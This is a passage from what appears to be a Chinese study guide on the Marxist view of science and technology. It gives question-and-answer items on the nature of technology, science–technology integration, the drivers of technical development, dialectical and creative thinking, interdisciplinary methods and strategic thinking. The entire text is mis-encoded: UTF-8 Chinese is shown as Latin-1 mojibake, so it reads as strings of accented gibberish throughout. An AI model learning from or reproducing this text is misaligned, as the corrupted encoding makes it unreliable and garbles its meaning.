¼æ–¯è®¤ä¸ºæŠ€æœ¯åœ¨æœ¬è´¨ä¸Šä½“ç°äº†â€œäººç±»å¯¹è‡ªç„¶çš„å®è·µå…³ç³»â€ï¼ŒæŠ€æœ¯æ˜¯äººçš„æœ¬è´¨åŠ›é‡çš„å¯¹è±¡åŒ–ã€‚ ç¬¬ä¸€ï¼ŒåŠ³åŠ¨èµ„æ–™å»¶é•¿äº†äººçš„è‡ªç„¶çš„è‚¢ä½“ã€‚ ç¬¬äºŒï¼Œå·¥è‰ºå­¦åœ¨æœ¬è´¨ä¸Šæ­ç¤ºå‡ºäººå¯¹è‡ªç„¶çš„èƒ½åŠ¨å…³ç³»ã€‚ ç¬¬ä¸‰ï¼ŒæŠ€æœ¯çš„å‘å±•å¼•èµ·ç”Ÿäº§å…³ç³»çš„å˜é©ã€‚ ï¼ˆ2ï¼‰å›½å¤–å­¦è€…å¯¹æŠ€æœ¯æœ¬è´¨ç‰¹å¾çš„ç ”ç©¶ æ¬§ç¾æŠ€æœ¯å“²å­¦å­˜åœ¨å·¥ç¨‹å­¦çš„å’Œäººæ–‡ä¸»ä¹‰çš„ä¸¤ç§æŠ€æœ¯ç ”ç©¶è·¯çº¿ï¼›æ—¥æœ¬çš„æŠ€æœ¯è®ºåœ¨æŠ€æœ¯çš„æœ¬è´¨é—®é¢˜ä¸Šå½¢æˆäº†â€œæ–¹æ³•æŠ€èƒ½è¯´â€ã€â€œåŠ³åŠ¨æ‰‹æ®µè¯´â€ã€â€œçŸ¥è¯†åº”ç”¨è¯´â€ç­‰è§‚ç‚¹ã€‚è¿™äº›è§‚ç‚¹å„æœ‰ç‰¹è‰²ï¼Œä½†å¤§éƒ½è¡¨ç°å‡ºå¯¹æŠ€æœ¯ç†è§£çš„å•ä¸€æ€§ã€‚ æˆ‘ä»¬éœ€è¦ç”¨é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚è¿›è¡Œåˆ†æè¯„ä»·ã€‚é©¬å…‹æ€ä¸»ä¹‰è®¤ä¸ºï¼ŒæŠ€æœ¯æ˜¯äººç±»ä¸ºæ»¡è¶³è‡ªèº«çš„éœ€è¦ï¼Œåœ¨å®è·µæ´»åŠ¨ä¸­æ ¹æ®å®è·µç»éªŒæˆ–ç§‘å­¦åŸç†æ‰€åˆ›é€ å‘æ˜çš„å„ç§æ‰‹æ®µå’Œæ–¹å¼æ–¹æ³•çš„æ€»å’Œã€‚ä¸»è¦ä½“ç°åœ¨ä¸¤ä¸ªæ–¹é¢ï¼šä¸€æ˜¯æŠ€æœ¯æ´»åŠ¨ï¼Œç‹­ä¹‰çš„æŠ€æœ¯æ˜¯æŒ‡äººç±»åœ¨åˆ©ç”¨è‡ªç„¶ã€æ”¹é€ è‡ªç„¶çš„åŠ³åŠ¨è¿‡ç¨‹ä¸­æ‰€æŒæ¡çš„æ–¹æ³•å’Œæ‰‹æ®µï¼›å¹¿ä¹‰çš„æŠ€æœ¯æ˜¯æŒ‡äººç±»æ”¹é€ è‡ªç„¶ã€æ”¹é€ ç¤¾ä¼šå’Œæ”¹é€ äººç±»è‡ªèº«çš„æ–¹æ³•å’Œæ‰‹æ®µã€‚äºŒæ˜¯æŠ€æœ¯æˆæœï¼ŒåŒ…æ‹¬æŠ€æœ¯ç†è®ºã€æŠ€èƒ½æŠ€å·§ã€æŠ€æœ¯å·¥è‰ºä¸æŠ€æœ¯äº§å“ï¼ˆç‰©è´¨è®¾å¤‡ï¼‰ã€‚ æŠ€æœ¯åœ¨æœ¬è´¨ä¸Šä½“ç°äº†äººå¯¹è‡ªç„¶çš„å®è·µå…³ç³»ï¼Œæ˜¯äººçš„æœ¬è´¨åŠ›é‡çš„å±•ç°ï¼Œå±äºç›´æ¥ç”Ÿäº§åŠ›ï¼Œæ˜¯è‡ªç„¶æ€§å’Œç¤¾ä¼šæ€§ã€ç‰©è´¨æ€§å’Œç²¾ç¥æ€§ã€ä¸­ç«‹æ€§ä¸ä»·å€¼æ€§ã€ä¸»ä½“æ€§å’Œå®¢ä½“æ€§ã€è·ƒè¿æ€§å’Œç§¯ç´¯æ€§çš„ç»Ÿä¸€ã€‚ 4.å¦‚ä½•ç†è§£ç§‘å­¦æŠ€æœ¯ä¸€ä½“åŒ–çš„ç‰¹å¾ï¼Ÿ ï¼ˆ1ï¼‰ç°ä»£ç§‘å­¦çš„ä½“ç³»ç»“æ„ç”±å­¦ç§‘ç»“æ„å’ŒçŸ¥è¯†ç»“æ„ç»„æˆ å­¦ç§‘ç»“æ„ç”±åŸºç¡€ç§‘å­¦ã€æŠ€æœ¯ç§‘å­¦ã€å·¥ç¨‹ç§‘å­¦æ„æˆã€‚çŸ¥è¯†ç»“æ„ç”±ç§‘å­¦äº‹å®ã€ç§‘å­¦æ¦‚å¿µã€ç§‘å­¦å®šå¾‹ã€ç§‘å­¦å‡è¯´ã€ç§‘å­¦ç†è®ºæ„æˆã€‚ç°ä»£ç§‘å­¦çš„ä½“ç³»ç»“æ„è¡¨ç°å‡ºç°ä»£ç§‘å­¦çš„å‘å±•è¿‡ç¨‹ï¼Œå…¶ä¸­å­¦ç§‘ç»“æ„å½¢æˆç«‹ä½“çš„æ¶æ„ï¼ŒçŸ¥è¯†ç»“æ„å„è¦ç´ æ¸—é€åœ¨å­¦ç§‘ç»“æ„ç›¸å¯¹åº”çš„è¦ç´ ä¹‹ä¸­ã€‚åŸºç¡€ç§‘å­¦ã€æŠ€æœ¯ç§‘å­¦ã€å·¥ç¨‹ç§‘å­¦éƒ½æ˜¯ç³»ç»ŸåŒ–çš„çŸ¥è¯†ï¼Œéƒ½ä¼šç»è¿‡ä¸€ä¸ªç”±ç§‘å­¦äº‹å®åˆ°ç§‘å­¦ç†è®ºçš„å½¢æˆè¿‡ç¨‹ã€‚ ï¼ˆ2ï¼‰ç°ä»£æŠ€æœ¯çš„ä½“ç³»ç»“æ„ç”±é—¨ç±»ç»“æ„å’Œå½¢æ€ç»“æ„ç»„æˆ é—¨ç±»ç»“æ„ç”±å®éªŒæŠ€æœ¯ã€åŸºæœ¬æŠ€æœ¯å’Œäº§ä¸šæŠ€æœ¯æ„æˆã€‚ å½¢æ€ç»“æ„ç”±ç»éªŒå½¢æ€çš„æŠ€æœ¯ã€å®ä½“å½¢æ€çš„æŠ€æœ¯å’ŒçŸ¥è¯†å½¢æ€çš„æŠ€æœ¯æ„æˆã€‚ ç°ä»£æŠ€æœ¯çš„ä½“ç³»ç»“æ„è¡¨ç°å‡ºç°ä»£æŠ€æœ¯çš„å‘å±•è¿‡ç¨‹ï¼Œå…¶ä¸­é—¨ç±»ç»“æ„æ˜¯ç«‹ä½“çš„æ¶æ„ï¼Œå½¢æ€ç»“æ„çš„å„è¦ç´ åŒæ ·æ¸—é€å’‹é—¨ç±»ç»“æ„ç›¸å¯¹åº”çš„è¦ç´ å½“ä¸­ã€‚å®éªŒæŠ€æœ¯ã€åŸºæœ¬æŠ€æœ¯å’Œäº§ä¸šæŠ€æœ¯éƒ½åŒ…å«ç»éªŒæŠ€èƒ½ï¼Œéƒ½ä½¿ç”¨å·¥å…·æœºå™¨ï¼Œéƒ½è•´å«äº†çŸ¥è¯†ã€‚ ç°ä»£ç§‘å­¦æŠ€æœ¯ä½“ç³»ç»“æ„çš„ç ”ç©¶è¡¨æ˜ï¼Œç§‘å­¦æŠ€æœ¯åœ¨å„è‡ªçš„å‘å±•ä¸­ï¼Œä¸ä½†æ—¥ç›Šå¤šæ ·åŒ–å’Œç³»ç»ŸåŒ–ï¼Œè€Œä¸”è¶Šæ¥è¶Šå‘ˆç°å‡ºç§‘å­¦æŠ€æœ¯ä¸€ä½“åŒ–çš„ç‰¹å¾ã€‚ 5.ä¸ºä»€ä¹ˆè¯´ç§‘å­¦å‘å±•è¡¨ç°ä¸ºç»§æ‰¿ä¸åˆ›æ–°çš„ç»Ÿä¸€ï¼Ÿ ç»§æ‰¿ï¼šå¸‚ç§‘å­¦æŠ€æœ¯å‘å±•ä¸­çš„é‡å˜ï¼Œå®ƒå¯ä½¿ç§‘å­¦çŸ¥è¯†å»¶ç»­ã€æ‰©å¤§å’ŒåŠ æ·±ã€‚ç§‘å­¦æ˜¯ä¸ªå¼€æ”¾ç³»ç»Ÿï¼Œå®ƒåœ¨æ—¶é—´ä¸Šæœ‰ç»§æ‰¿æ€§ï¼Œåœ¨ç©ºé—´ä¸Šæœ‰ç§¯ç´¯æ€§ã€‚åªæœ‰ç»§æ‰¿å·²å‘ç°çš„ç§‘å­¦äº‹å®ã€å·²æœ‰ç†è®ºä¸­çš„æ­£ç¡®ä¸œè¥¿ï¼Œç§‘å­¦æ‰èƒ½å‘å±•ã€ä¸æ–­å®Œå–„ã€‚ åˆ›æ–°ï¼šæ˜¯äººç±»å¯¹è‡ªç„¶çš„è®¤è¯†å‡ºç°æ–°çš„é£è·ƒï¼Œå¼•èµ·ç§‘å­¦å‘å±•ä¸­çš„è´¨å˜ã€‚åˆ›æ–°æ˜¯ç»§æ‰¿çš„å¿…ç„¶è¶‹åŠ¿å’Œç›®çš„ã€‚ åœ¨ç§‘å­¦æŠ€æœ¯çš„å‘å±•æ¨¡å¼åŠåŠ¨åŠ›é—®é¢˜ä¸Šï¼Œé©¬å…‹æ€ä¸»ä¹‰è®¤ä¸ºç§‘å­¦å‘å±•åœ¨çºµå‘ä¸Šè¡¨ç°ä¸ºæ¸è¿›ä¸é£è·ƒçš„ç»Ÿä¸€ï¼Œåœ¨æ¨ªå‘ä¸Šè¡¨ç°ä¸ºåˆ†åŒ–ä¸ç»¼åˆçš„ç»Ÿä¸€ï¼Œåœ¨æ€»ä½“è¶‹åŠ¿ä¸Šè¡¨ç°ä¸ºç»§æ‰¿ä¸åˆ›æ–°çš„ç»Ÿä¸€ã€‚ æŠ€æœ¯çš„å‘å±•ç”±ç¤¾ä¼šéœ€è¦ã€æŠ€æœ¯ç›®çš„åŠç§‘å­¦è¿›æ­¥ç­‰å¤šç§å› ç´ å…±åŒæ¨åŠ¨ã€‚å…¶ä¸­ç¤¾ä¼šéœ€æ±‚ä¸æŠ€æœ¯å‘å±•æ°´å¹³ä¹‹é—´çš„çŸ›ç›¾æ˜¯æŠ€æœ¯å‘å±•çš„åŸºæœ¬åŠ¨åŠ›ï¼ŒæŠ€æœ¯ç›®çš„å’ŒæŠ€æœ¯æ‰‹æ®µä¹‹é—´çš„çŸ›ç›¾æ˜¯æŠ€æœ¯å‘å±•çš„ç›´æ¥åŠ¨åŠ›ï¼Œç§‘å­¦è¿›æ­¥æ˜¯æŠ€æœ¯å‘å±•çš„é‡è¦æ¨åŠ¨åŠ›ã€‚ 6.æ€æ ·è®¤è¯†æŠ€æœ¯å‘å±•çš„åŠ¨åŠ›ï¼Ÿ é©¬å…‹æ€ä¸»ä¹‰è®¤ä¸ºï¼ŒæŠ€æœ¯çš„å‘å±•ç”±ç¤¾ä¼šéœ€è¦ã€æŠ€æœ¯ç›®çš„ä»¥åŠç§‘å­¦è¿›æ­¥ç­‰å¤šç§å› ç´ å…±åŒæ¨åŠ¨ã€‚ ï¼ˆ1ï¼‰ç¤¾ä¼šéœ€æ±‚ä¸æŠ€æœ¯å‘å±•æ°´å¹³ä¹‹é—´çš„çŸ›ç›¾æ˜¯æŠ€æœ¯å‘å±•çš„åŸºæœ¬åŠ¨åŠ› ä»»ä½•æŠ€æœ¯ï¼Œæœ€æ—©éƒ½æºäºäººç±»çš„éœ€è¦ã€‚æ­£æ˜¯ä¸ºäº†ç”Ÿå­˜å‘å±•çš„éœ€è¦ï¼Œäººç±»èµ·åˆæ¨¡ä»¿è‡ªç„¶ï¼Œè¿›è€Œè¿›è¡Œåˆ›é€ ï¼Œå‘æ˜äº†å„ç§æŠ€æœ¯ã€‚åŒæ—¶ï¼Œæ–‡åŒ–å¯¹æŠ€æœ¯å‘å±•å…·æœ‰æ˜æ˜¾çš„å¼ åŠ›ä½œç”¨ã€‚å…ˆè¿›çš„æ€æƒ³æ–‡åŒ–ä¼šæ¨åŠ¨æŠ€æœ¯çš„å‘å±•ï¼Œè€Œè½åçš„æ€æƒ³æ–‡åŒ–åˆ™ä¼šåˆ¶çº¦å’Œé˜»ç¢æŠ€æœ¯çš„å‘å±•ï¼ŒåŒ…æ‹¬å½±åƒæŠ€æœ¯å†³ç­–ã€æŠ€æœ¯ç ”å‘ä»¥åŠæŠ€æœ¯æˆæœçš„äº§ä¸šåŒ–å„æ–¹é¢ã€‚ ï¼ˆ2ï¼‰æŠ€æœ¯ç›®çš„å’ŒæŠ€æœ¯æ‰‹æ®µä¹‹é—´çš„çŸ›ç›¾æ˜¯æŠ€æœ¯å‘å±•çš„ç›´æ¥åŠ¨åŠ› æŠ€æœ¯ç›®çš„å°±æ˜¯åœ¨æŠ€æœ¯å®è·µè¿‡ç¨‹ä¸­åœ¨è§‚å¿µä¸Šé¢„å…ˆå»ºç«‹çš„æŠ€æœ¯ç»“æœçš„ä¸»è§‚å½¢è±¡ï¼Œæ˜¯æŠ€æœ¯å®è·µçš„å†…åœ¨è¦æ±‚ï¼Œå½±å“å¹¶è´¯ç©¿æŠ€æœ¯å®è·µçš„å…¨è¿‡ç¨‹ã€‚æŠ€æœ¯æ‰‹æ®µå³å®ç°æŠ€æœ¯ç›®çš„ä¸­ä»‹å› ç´ ï¼ŒåŒ…æ‹¬å®ç°æŠ€æœ¯ç›®çš„çš„å·¥å…·å’Œå®ç”¨å·¥å…·çš„å½¢å¼ã€‚æŠ€æœ¯ç›®çš„çš„æå‡ºå’Œå®ç°ï¼Œå¿…é¡»ä¾èµ–äºä¸ä¹‹ç›¸åŒ¹é…çš„æŠ€æœ¯æ‰‹æ®µã€‚æŠ€æœ¯æ‰‹æ®µæ˜¯å®ç°æŠ€æœ¯ç›®çš„çš„ä¸­ä»‹å’Œä¿è¯ï¼Œå®ƒåŒ…æ‹¬è¾¾åˆ°æŠ€æœ¯åŠŸèƒ½è¦æ±‚æ‰€ä½¿ç”¨çš„å·¥å…·ä»¥åŠåº”ç”¨å·¥å…·çš„æ–¹å¼ã€‚ ï¼ˆ3ï¼‰ç§‘å­¦è¿›æ­¥æ˜¯æŠ€æœ¯å‘å±•çš„é‡è¦æ¨åŠ¨åŠ› 19ä¸–çºªä¸­æœŸä»¥åï¼Œç§‘å­¦èµ°åˆ°äº†æŠ€æœ¯å‰é¢ï¼Œæˆä¸ºæŠ€æœ¯å‘å±•çš„ç†è®ºå‘å¯¼ã€‚ç§‘å­¦é©å‘½å¯¼è‡´æŠ€æœ¯é©å‘½ï¼ŒæŠ€æœ¯å‘å±•å¯¹ç§‘å­¦è¿›æ­¥çš„ä¾èµ–ç¨‹åº¦è¶Šæ¥è¶Šé«˜ï¼ŒæŠ€æœ¯å·²æˆä¸ºç§‘å­¦çš„åº”ç”¨ã€‚å°¤å…¶æ˜¯å½“ä»Šç¤¾ä¼šçš„å‘å±•ï¼Œå·²å½¢æˆäº†ç§‘å­¦æŠ€æœ¯ä¸€ä½“åŒ–çš„åŒå‘äº’åŠ¨è¿‡ç¨‹ã€‚ ç¬¬ä¸‰ç«  ç§‘å­¦æŠ€æœ¯æ–¹æ³•è®º 1.å¦‚ä½•ç†è§£é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯æ–¹æ³•è®ºä¸ç§‘å­¦ç ”ç©¶ä¸­çš„å…·ä½“æ–¹æ³•çš„å…³ç³»ï¼Ÿ é©¬å…‹æ€ä¸»ä¹‰çš„ç§‘å­¦æŠ€æœ¯æ–¹æ³•è®ºæ˜¯ä»¥è¾©è¯å”¯ç‰©ä¸»ä¹‰ç«‹åœºã€è§‚ç‚¹ä¸ºåŸºç¡€ï¼Œå¸å–å…·ä½“ç§‘å­¦æŠ€æœ¯ç ”ç©¶ä¸­çš„åŸºæœ¬æ–¹æ³•ï¼Œå¹¶å¯¹å…¶è¿›è¡Œæ¦‚æ‹¬å’Œå‡åçš„æ–¹æ³•è®ºã€‚ ç§‘å­¦æŠ€æœ¯ç ”ç©¶ï¼Œç¦»ä¸å¼€è¾©è¯æ€ç»´ã€‚åˆ†æä¸ç»¼åˆã€å½’çº³ä¸æ¼”ç»ã€ä»æŠ½è±¡åˆ°å…·ä½“ã€å†å²ä¸é€»è¾‘çš„ç»Ÿä¸€ï¼Œè¿™äº›è¾©è¯æ€ç»´çš„å½¢å¼ä½“ç°å’Œè´¯å½»åœ¨ç§‘å­¦å®¶ã€å·¥ç¨‹å¸ˆçš„å…·ä½“ç§‘å­¦æŠ€æœ¯ç ”ç©¶ä¸­ã€‚è‡ªè§‰çš„è®¤è¯†å’Œæå‡è¿™äº›è¾©è¯æ€ç»´çš„å½¢å¼ï¼Œå¯¹äºæ ‘ç«‹ï¼Œé©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ï¼Œæ·±å…¥ç ”ç©¶ç§‘å­¦æŠ€æœ¯ï¼Œå»ºè®¾åˆ›æ–°å‹å›½å®¶å…·æœ‰é‡è¦æ„ä¹‰ã€‚ 2.å¦‚ä½•ç†è§£è¾©è¯æ€ç»´æ¸—é€åœ¨ç§‘å­¦ç ”ç©¶çš„å…¨éƒ¨è¿‡ç¨‹ä¸­ï¼Ÿ é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯æ–¹æ³•è®ºçš„æ ¸å¿ƒå°±æ˜¯è¾©è¯æ€ç»´ã€‚é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯æ–¹æ³•è®ºçš„åŸºæœ¬åŸåˆ™å°±æ˜¯æŠŠè¾©è¯æ³•è´¯å½»åˆ°ç§‘å­¦æŠ€æœ¯ç ”ç©¶ä¸­ï¼Œä»¥å¯¹ç«‹ç»Ÿä¸€ã€è´¨é‡äº’å˜å’Œå¦å®šä¹‹å¦å®šçš„è¾©è¯æ€æƒ³æ¸—é€åˆ°å…·ä½“çš„ç§‘å­¦æŠ€æœ¯ç ”ç©¶ä¸­ï¼ŒæŠŠæ¡å…·ä½“ç§‘å­¦æŠ€æœ¯çš„ç ”ç©¶è¿‡ç¨‹ã€‚ 3.å¦‚ä½•æŠŠæ¡åˆ›é€ æ€§æ€ç»´ç‰¹æ€§ï¼Ÿ åˆ›é€ æ˜¯ç§‘å­¦ç ”ç©¶å’ŒæŠ€æœ¯å‘æ˜æœ€é‡è¦ç‰¹æ€§ä¹‹ä¸€ã€‚åˆ›é€ æ€§æ€ç»´ä¸æ˜¯åœ¨æ‰€æœ‰è¾©è¯æ€ç»´å’Œç§‘å­¦ç ”ç©¶æ–¹æ³•ä¹‹å¤–ç‹¬ç«‹çš„ä¸€ç§æ€ç»´æ–¹å¼æˆ–æ–¹æ³•ï¼Œæ˜¯èƒ½å¤Ÿæå‡ºåˆ›è§çš„æ€ç»´ï¼Œä¸ä¸€èˆ¬æ€§æ€ç»´ç›¸æ¯”ï¼Œæ˜¯åœ¨æ€ç»´ç‰¹å¾æ–¹é¢ä¸åˆ»æ¿ï¼Œç»„åˆå„ç§æ€ç»´ã€çµæ´»è°ƒç”¨æ€ç»´çš„ç‰¹æ€§ã€‚ åˆ›é€ æ€§æ€ç»´çš„ç‰¹ç‚¹æ˜¯æ€ç»´æ–¹å‘çš„æ±‚å¼‚æ€§ï¼Œæ€ç»´ç»“æ„çš„çµæ´»æ€§ã€æ€ç»´è¿›ç¨‹çš„é£è·ƒæ€§ã€æ€ç»´æ•ˆæœçš„æ•´ä½“æ€§ã€æ€ç»´è¡¨è¾¾çš„æ–°é¢–æ€§ç­‰ã€‚ åˆ›é€ æ€§æ€ç»´ç‰¹åˆ«æ³¨é‡é€»è¾‘æ€ç»´ä¸éé€»è¾‘æ€ç»´çš„ç»Ÿä¸€ã€æŠ½è±¡æ€ç»´ä¸å½¢è±¡æ€ç»´çš„è¾©è¯ç»Ÿä¸€ã€‚ 4.æ³¨æ„å¤šå­¦ç§‘çš„äº¤å‰ä¸èè´¯æœ‰ä½•æ–¹æ³•è®ºæ„ä¹‰ï¼Ÿ ç§»æ¤å’Œå­¦ç§‘äº¤å‰æˆ–è·¨å­¦ç§‘çš„ç ”ç©¶æ–¹æ³•ï¼Œæ˜¯åˆ›é€ æ€§æ€ç»´çš„ä¸¤ç§éå¸¸æœ‰æ•ˆçš„ç ”ç©¶æ–¹æ³•ã€‚å½“ä»£ç§‘å­¦ç ”ç©¶å’ŒæŠ€æœ¯å‘æ˜å˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œè¿›è¡Œç§»æ¤ä¸äº¤å‰ï¼Œé€šè¿‡å¤šå­¦ç§‘æˆ–è·¨å­¦ç§‘çš„ç ”ç©¶ï¼Œå¸¸å¸¸èƒ½å¤Ÿè·å¾—å•ä¸€å­¦ç§‘ç ”ç©¶æ— æ³•è·å¾—çš„åˆ›æ–°æˆæœã€‚å¤šå­¦ç§‘èåˆæˆ–é€šè¿‡è·¨å­¦ç§‘ç ”ç©¶é—®é¢˜ä¹Ÿæ˜¯å½“ä»£ç§‘å­¦å’ŒæŠ€æœ¯è§£å†³é—®é¢˜çš„åˆ›é€ æ€§æ–¹æ³•ï¼Œä½“ç°äº†å¹¿æ³›è”ç³»å’Œå‘å±•çš„è¾©è¯æ³•ã€‚ å½“ä»£å„é—¨ç§‘å­¦ä¹‹é—´çš„äº¤å‰å‹è¶Šæ¥è¶Šå¤§ï¼Œé€šè¿‡å­¦ç§‘ä¹‹é—´çš„äº¤å‰å¾€å¾€å¯ä»¥è·å¾—æ–°çš„è®¤è¯†ï¼Œå¸¦æ¥åˆ›æ–°ã€‚å­¦ç§‘äº¤å‰æˆä¸ºä¸€ç§æ–°çš„æ€è€ƒæ–¹å¼å’Œç ”ç©¶æ–¹æ³•ã€‚ æ‰€è°“å­¦ç§‘äº¤å‰æ–¹æ³•ï¼Œå°±æ˜¯ä¸¤é—¨ä»¥ä¸Šçš„å­¦ç§‘ä¹‹é—´åœ¨é¢å¯¹åŒä¸€ç ”ç©¶å¯¹è±¡æ—¶ï¼Œä»ä¸åŒå­¦ç§‘çš„è§’åº¦è¿›è¡Œæ¯”å¯¹ç ”ç©¶çš„æ–¹æ³•ã€‚å€Ÿé‰´å…¶ä»–å­¦ç§‘çš„ç ”ç©¶ï¼Œæ€è€ƒæœ¬å­¦ç§‘çš„é—®é¢˜å’Œå¯¹è±¡ï¼Œèåˆå…¶ä»–å­¦ç§‘çš„ç ”ç©¶æ–¹æ³•ï¼Œä»¥è¾¾åˆ°å¯¹ç ”ç©¶å¯¹è±¡çš„æ–°è®¤è¯†ã€‚ æ‰€è°“è·¨å­¦ç§‘æ–¹æ³•å°±æ˜¯é€šè¿‡å¤šå­¦ç§‘çš„åä½œå…±åŒè§£å†³åŒä¸€é—®é¢˜çš„æ–¹æ³•ï¼Œè·¨å­¦ç§‘ä¹Ÿæ˜¯ä¸€ç§å­¦ç§‘èåˆçš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºå¤šç»´èè´¯çš„æ–¹æ³•ã€‚ 5.æˆ˜ç•¥æ€§æ€ç»´å¯¹äºç§‘å­¦ç ”ç©¶æœ‰ä½•æ„ä¹‰ï¼Ÿ æˆ˜ç•¥æ€§æ€ç»´æ˜¯å¯¹æˆ˜ç•¥ç§‘å­¦å®¶çš„æ€ç»´è¦æ±‚ã€‚åŒæ—¶å¯¹äºä¸€ä¸ªä»äº‹ä¸€èˆ¬ç§‘å­¦ç ”ç©¶ã€æŠ€æœ¯å‘æ˜å’Œå·¥ç¨‹å»ºè®¾çš„ç§‘å­¦å®¶ä¹Ÿæœ‰é‡è¦æ„ä¹‰ã€‚ä¹ è¿‘å¹³éå¸¸é‡è§†æˆ˜ç•¥æ€§æ€ç»´çš„é‡è¦ä½œç”¨ä¸æ·±åˆ»æ„ä¹‰ï¼Œæ˜¯å…¶æå‡ºçš„â€œå…­å¤§æ€ç»´â€ä¹‹ä¸€ï¼Œæˆ˜ç•¥æ€§æ€ç»´å¯¹äºç§‘å­¦ç ”ç©¶è€Œè¨€ï¼Œéå¸¸é‡è¦ã€‚ æˆ˜ç•¥æ€§æ€ç»´æ˜¯é«˜ç»è¿œç©ã€ç»Ÿæ½å…¨å±€ã€å–„äºæŠŠæ¡äº‹ç‰©å‘å±•æ€»ä½“è¶‹åŠ¿å’Œæ–¹å‘çš„æ€ç»´æ–¹æ³•ï¼Œå±•ç¤ºçš„æ˜¯çœ‹é—®é¢˜çš„é«˜åº¦å’Œæ·±åº¦ã€‚å¤äººè®²ï¼šâ€œä¸è°‹ä¸‡ä¸–è€…ï¼Œä¸è¶³è°‹ä¸€æ—¶ï¼›ä¸è°‹å…¨å±€è€…ï¼Œä¸è¶³è°‹ä¸€åŸŸã€‚â€ç§‘å­¦å®¶ä¸å·¥ç¨‹å¸ˆæ²¡æœ‰æˆ˜ç•¥æ€§æ€ç»´ã€å…·æœ‰ä»€ä¹ˆæ ·çš„æˆ˜ç•¥æ€§æ€ç»´ï¼Œä¸€å®šç¨‹åº¦ä¸Šå†³å®šç€åœ¨ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰ä¼Ÿå¤§äº‹ä¸šä¸­çš„ç§‘å­¦æŠ€æœ¯ç ”ç©¶èƒ½ç™»å¤šé«˜ã€èƒ½èµ°å¤šè¿œã€å°†æŠµè¾¾ä½•å¤„ã€‚æˆ˜ç•¥æ€§æ€ç»´èƒ½åŠ›çš„å¼ºå¼±ï¼Œå–å†³äºæ€è€ƒé—®é¢˜çš„é«˜åº¦ã€ç†è®ºç ”ç©¶çš„æ·±åº¦ã€çŸ¥è¯†è§†é‡çš„å¹¿åº¦ï¼Œä»¥åŠå¯¹äºç§‘å­¦æŠ€æœ¯å‘å±•å…¨å±€çš„æ—¶é—´è·¨åº¦çš„è®¤è¯†ä¸æŠŠæ¡ã€‚ å¯¹äºå›½å®¶è€Œè¨€ï¼Œç§‘å­¦æŠ€æœ¯çš„æ€»ä½“è§„åˆ’æ˜¯ä¸€ç§ç§‘å­¦æŠ€æœ¯ç ”ç©¶çš„æˆ˜ç•¥ï¼Œæˆ˜ç•¥ç§‘å­¦å®¶éœ€è¦æŒæ¡å›½å®¶ç§‘å­¦æŠ€æœ¯çš„åŸºæœ¬æˆ˜ç•¥ï¼ŒæŒ‰ç…§å›½å®¶éœ€è¦ï¼Œç»“åˆè‡ªå·±åŠå…¶ç ”ç©¶å›¢é˜Ÿçš„ç ”ç©¶ç¡®å®šç§‘å­¦ç ”ç©¶æ–¹å‘ã€‚ ç¬¬å››ç«  ç§‘å­¦æŠ€æœ¯ç¤¾ä¼šè®º 1.ä¸ºä»€ä¹ˆè¯´â€œç§‘å­¦æ˜¯ä¸€ç§åœ¨å†å²ä¸Šèµ·æ¨åŠ¨ä½œç”¨çš„ã€é©å‘½çš„åŠ›é‡â€ï¼Ÿ ç§‘å­¦æŠ€æœ¯æ˜¯å†å²å‘å±•çš„ç«è½¦å¤´ï¼Œæ”¹å˜äº†ç¤¾ä¼šå†å²è¿›ç¨‹ï¼Œé€ å°±äº†æ–°çš„ç¤¾ä¼šå½¢æ€;æ¨åŠ¨äº†ç”Ÿäº§åŠ›å†…éƒ¨å„è¦ç´ çš„å˜é©ï¼Œå¼•å‘äº†äº§ä¸šç»“æ„çš„è°ƒæ•´ã€ç»æµå½¢å¼çš„å˜åŒ–å’Œç»æµå¢é•¿æ–¹å¼çš„è½¬å˜ï¼Œé€ å°±äº†ç»æµè½¬å‹;äº§ç”Ÿäº†æŠ€æœ¯å¼‚åŒ–ç°è±¡ï¼Œè¦å¯¹å¼‚åŒ–çš„èµ„æœ¬ä¸»ä¹‰åˆ¶åº¦å±•å¼€æ‰¹åˆ¤ï¼Œæ›´å¥½åœ°å‘æŒ¥ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šåŠŸèƒ½ã€‚ ç§‘å­¦æŠ€æœ¯ä½œä¸ºç¤¾ä¼šå‘å±•çš„åŠ¨åŠ›,æ˜¯é©¬å…‹æ€ä¸»ä¹‰çš„åŸºæœ¨è§‚ç‚¹ã€‚ç§‘å­¦æ˜¯ç”Ÿäº§åŠ›çš„â€œçŸ¥è¯†çš„å½¢æ€â€ã€‚ä½œä¸ºç”Ÿäº§åŠ›çš„ç§‘å­¦æŠ€æœ¯ï¼Œèƒ½å¤Ÿå¤§å¤§æé«˜ç¤¾ä¼šç”Ÿäº§åŠ›æ°´å¹³ï¼Œæ¨åŠ¨ç€æ•´ä¸ªäººç±»ç‰©è´¨ç”Ÿäº§çš„è¿…çŒ›å‘å±•ã€‚ ä½œä¸ºå¼ºå¤§çš„ç²¾ç¥åŠ›é‡çš„ç§‘å­¦æŠ€æœ¯ï¼Œèƒ½å¤Ÿä¿ƒè¿›äººç±»æ€æƒ³çš„è§£æ”¾ï¼Œåœ¨äº§ä¸šé©å‘½çš„åŸºç¡€ä¸Šï¼Œæ¨åŠ¨ç¤¾ä¼šå˜é©ï¼Œå¯¹ç¤¾ä¼šç”Ÿäº§å…³ç³»äº§ç”Ÿæœ‰åŠ›å½±å“ã€‚ ä½œä¸ºäººç±»æœ€ç»ˆèµ°å‘ç™½ç”±çš„ç§‘å­¦æŠ€æœ¯ï¼Œèƒ½å¤Ÿä½œä¸ºè§£æ”¾çš„æ æ†ï¼Œå¢è¿›äººç±»ç²¾ç¥ç”Ÿæ´»çš„ä¸°å¯Œæ€§å’Œè‡ªæˆ‘å‘å±•èƒ½åŠ›ï¼Œæœ‰åŠ©äºå®ç°äººçš„å…¨é¢è‡ªç”±çš„å‘å±•ã€‚ 